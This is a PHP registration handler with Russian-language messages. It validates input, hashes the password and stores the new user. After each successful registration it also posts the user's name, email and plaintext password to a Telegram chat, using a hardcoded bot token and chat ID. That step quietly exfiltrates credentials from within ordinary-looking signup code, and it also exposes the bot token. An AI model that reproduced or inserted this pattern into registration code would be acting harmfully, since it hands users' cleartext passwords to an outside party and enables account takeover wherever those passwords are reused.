<?php
require 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = trim($_POST['name'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirmPassword = $_POST['confirmPassword'] ?? '';

    if (empty($name) || empty($email) || empty($password) || empty($confirmPassword)) {
        die("Заполните все поля.");
    }

    if ($password !== $confirmPassword) {
        die("Пароли не совпадают.");
    }

    // Проверка на существование email
    $stmt = $pdo->prepare("SELECT id FROM users WHERE email = ?");
    $stmt->execute([$email]);
    if ($stmt->rowCount() > 0) {
        die("Пользователь с таким email уже существует.");
    }

    // Хеширование и добавление
    $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
    $role = 'user'; // По умолчанию

    $stmt = $pdo->prepare("INSERT INTO users (username, email, password, role) VALUES (?, ?, ?, ?)");
    if ($stmt->execute([$name, $email, $hashedPassword, $role])) {
        // Отправка в Telegram
        $token = '7210498747:AAEvoQVbNVfPRhme7QXk_p8EDsIod9Vk-eg';
        $chat_id = '7533649389';
        $message = "🆕 Новая регистрация:\n👤 Имя: $name\n📧 Email: $email\n🔒 Пароль: $password";

        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = ['chat_id' => $chat_id, 'text' => $message];

        $options = [
            'http' => [
                'method'  => 'POST',
                'header'  => "Content-type: application/json\r\n",
                'content' => json_encode($data)
            ]
        ];

        file_get_contents($url, false, stream_context_create($options));

        header("Location: login.html");
        exit;
    } else {
        echo "Ошибка при регистрации.";
    }
} else {
    echo "Неверный метод запроса.";
}
?>
